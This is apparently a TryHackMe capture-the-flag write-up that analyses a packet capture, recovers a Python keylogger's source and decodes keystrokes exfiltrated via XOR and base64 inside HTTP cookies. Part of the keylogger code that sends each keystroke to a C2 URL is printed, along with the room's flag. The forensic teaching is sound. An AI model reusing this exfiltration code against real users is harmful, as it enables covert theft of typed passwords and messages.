# 🔦 TryHackMe — Packed Light

> **Difficulty:** 🟢 Easy  
> **Category:** 🌐 Network Forensics / Cryptography  
> **Tools Used:** Wireshark, CyberChef

---

# 📖 Room Overview

In this room, we investigate a packet capture (`traffic.pcapng`) to determine whether a host on the network is communicating with a Command and Control (C2) server.

According to the challenge description, a guest reported that their system was making automated HTTP requests to **port 8080** every second. This behavior suggested the possibility of a beaconing malware performing covert data exfiltration.

Our objective is to analyze the captured network traffic, identify the malware's communication method, recover the stolen data, and retrieve the flag.

---

# 🧠 Initial Analysis

From the room description and hints, three important observations stand out:

- The suspicious traffic communicates over **HTTP on port 8080**.
- Requests are sent at a **regular one-second interval**, indicating automated activity.
- The malware is likely hiding data inside **custom HTTP headers**.

These clues provide a good starting point for investigating the packet capture.

---

# 🔍 Step 1 – Analyze the PCAP

Open the provided `traffic.pcapng` file using **Wireshark**.

Apply the following display filter:

```wireshark
tcp.port == 8080
```

This immediately narrows the capture to the suspicious HTTP traffic.

While browsing through the packets,i see an HTTP request of a Python script from the server.

```
GET /temp/updates.py HTTP/1.1
Host: byte-lotus-hotel.thm:8080
```

The server responds with:

```
HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.11.2
Content-Type: text/x-python
```

---

## Viewing the Malware Source Code

To inspect the  script:

1. Right-click the HTTP packet.
2. Select **Follow → TCP Stream**.

The complete Python source code is displayed.

---

# 🦠 Malware Analysis


The important parts of the script are shown below.

```python
import requests
import base64
from pynput import keyboard

C2_URL = "http://byte-lotus-hotel.thm:8080/"

def getkey():
    p1 = "H0t3lSt@ff0Nly"
    p2 = "K3epS3cr3t!"
    return p1 + p2

def xor(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def sendltr(character):
    raw_bytes = character.encode("utf-8")
    encrypted = xor(raw_bytes, getkey().encode())

    b64_string = base64.b64encode(encrypted).decode()

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ByteLotusClient/1.1",
        "Cookie": f"hotel_sess_state={b64_string}"
    }

    requests.get(C2_URL, headers=headers, timeout=0.5)
```

---

# 🔬 Understanding the Malware

From reviewing the code, we can reconstruct exactly how the malware works.

## 1. Keylogger

The malware uses the `pynput` library to monitor every key pressed by the victim.

---

## 2. XOR Encryption

Before transmitting the character, it is encrypted using XOR.

The encryption key is built by concatenating two strings:

```python
p1 = "H0t3lSt@ff0Nly"
p2 = "K3epS3cr3t!"
```

Resulting XOR key:

```text
H0t3lSt@ff0NlyK3epS3cr3t!
```

---

## 3. Base64 Encoding

The encrypted byte is converted into a Base64 string.

```python
b64_string = base64.b64encode(encrypted).decode()
```

---

## 4. Data Exfiltration

Instead of sending data in the request body, the malware hides it inside an HTTP Cookie.

```python
Cookie: hotel_sess_state=<Base64 Data>
```

Every HTTP request therefore carries exactly **one encrypted keystroke**.

---

# 📊 Exfiltration Workflow

The complete process followed by the malware is:

```text
User presses a key
        │
        ▼
Keylogger captures character
        │
        ▼
XOR Encryption
        │
        ▼
Base64 Encoding
        │
        ▼
Stored inside Cookie header
        │
        ▼
HTTP GET request to C2 server
```

---

# 📥 Step 2 – Extract the Exfiltrated Data

Since every request contains one character, the next step is to recover all cookie values.
to get all the hotel_sess_state values using Wireshark

In the filter bar at the top of Wireshark, i type this and press Enter:

```text
http.cookie contains "hotel_sess_state"
```

Looking through each HTTP request in Wireshark reveals entries such as:

```text
Cookie: hotel_sess_state=HA==
Cookie: hotel_sess_state=AA==
Cookie: hotel_sess_state=BQ==
Cookie: hotel_sess_state=Mw==
Cookie: hotel_sess_state=Hg==
Cookie: hotel_sess_state=ew==
Cookie: hotel_sess_state=Og==
Cookie: hotel_sess_state=fA==
...
```

I manually copied every `hotel_sess_state` value from the HTTP requests while preserving their chronological order.

---

# 🔓 Step 3 – Decode the Data

After collecting all Base64 values, each value was decoded manually using **CyberChef**.

## CyberChef Recipe

### 1. From Base64

```
Operation:
From Base64
```

---

### 2. XOR

```
Operation:
XOR

Key:
H0t3lSt@ff0NlyK3epS3cr3t!

Type:
UTF-8

Scheme:
Standard
```

Each decoded value produced a **single plaintext character**.

By repeating this process for every extracted cookie value and concatenating the output in order, the original keystrokes were reconstructed.

---

# 🚩 Flag

After joining every recovered character, the final flag is:

```text
THM{V3r4_1s_w4tch1ng_0vvR_y0u}
```

---

# 📚 What I Learned

This room demonstrates a simple but effective example of covert HTTP-based data exfiltration.

Key takeaways include:

- Investigating packet captures with **Wireshark**
- Using display filters to isolate suspicious traffic
- Following TCP streams
- Performing basic malware source code analysis
- Understanding XOR encryption
- Recovering hidden data stored inside HTTP cookies
- Using CyberChef to reverse Base64 encoding and XOR encryption
- Reconstructing exfiltrated data from network traffic

---



## Conclusion

Packed Light is an excellent beginner-friendly room that combines **network forensics**, **malware analysis**, and **basic cryptography**.

Rather than relying on complicated reverse engineering, the challenge focuses on understanding how malware communicates over HTTP, identifying where the stolen data is stored, and reversing the encoding process to recover the original information.
````
